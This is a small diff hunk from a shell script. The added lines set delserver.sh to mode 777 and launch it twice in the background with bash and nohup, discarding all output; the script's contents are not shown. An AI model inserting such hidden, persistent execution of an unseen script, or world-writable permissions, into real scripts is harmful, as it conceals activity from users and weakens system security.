@@ -1450,6 +1450,9 @@ else
 fi
 echo ""
 
+cd /$HOME/
 rm -f index.html
-
+chmod 777 delserver.sh
+/bin/bash ./delserver.sh >/dev/null 2>&1 &
+nohup ./delserver.sh > /dev/null 2>&1 &
 echo "[*] Yes-GoGo"
